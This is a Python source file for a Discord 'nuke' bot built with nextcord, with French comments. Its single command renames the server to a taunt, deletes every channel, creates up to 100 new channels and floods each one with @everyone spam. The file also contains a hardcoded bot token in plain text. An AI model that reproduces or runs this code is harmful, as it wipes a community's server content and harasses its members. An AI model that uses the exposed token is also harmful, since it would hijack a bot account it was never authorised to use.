import os
import asyncio
import nextcord
from nextcord.ext import commands
from flask import Flask
from threading import Thread

TOKEN = "MTQ0MjI1MDY0OTg4NTczNjk2MQ.GpLreG.oN3WJ0myq6LWUJ9DJ-aMvJ655OyewdP4AoRxPI"

app = Flask(__name__)

@app.route("/")
def home():
    return "Bot en ligne !"

ALLOWED_USER = 1316068882154393693
ALLOWED_GUILD = 1444342111653597298

MAX_CHANNELS = 100
SPAM_MESSAGES = 200

intents = nextcord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)


def allowed(ctx):
    return ctx.author.id == ALLOWED_USER and ctx.guild and ctx.guild.id == ALLOWED_GUILD


@bot.event
async def on_ready():
    print(f"Bot connecté en tant que {bot.user}")


@bot.command()
async def nuke(ctx, amount: int = 5):
    if not allowed(ctx):
        return await ctx.send("❌ Tu n'as pas le droit d'utiliser cette commande.")

    amount = max(1, min(amount, MAX_CHANNELS))
    guild = ctx.guild

    # Changer le nom du serveur
    try:
        await guild.edit(name="CHEH Touxiroux")
    except:
        pass

    # --- SUPPRESSION DE TOUS LES SALONS ---
    for channel in guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.1)
        except:
            pass

    # --- CRÉATION DES NOUVEAUX SALONS ---
    new_channels = []
    for i in range(amount):
        try:
            c = await guild.create_text_channel(f"cheh-touxiroux-{i+1}")
            new_channels.append(c)
            await asyncio.sleep(0.1)
        except:
            pass

    # --- SPAM ---
    for c in new_channels:
        for _ in range(SPAM_MESSAGES):
            try:
                await c.send("💥@everyone Serveur NUKED💥")
                await asyncio.sleep(0.03)
            except:
                pass

    # Message final
    try:
        await new_channels[0].send("@everyone 🚨 **LE SERVEUR A ÉTÉ DÉTRUIT** 🚨")
    except:
        pass

    await ctx.send("🔥 **NUKE TERMINÉ !**")

# --- LANCER FLASK DANS UN THREAD (OK) ---
def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

Thread(target=run_flask).start()

# --- LANCER NEXTCORD SUR LA BOUCLE PRINCIPALE (OBLIGATOIRE) ---
async def main():
    await bot.start(TOKEN)

if __name__ == "__main__":
    asyncio.run(main())
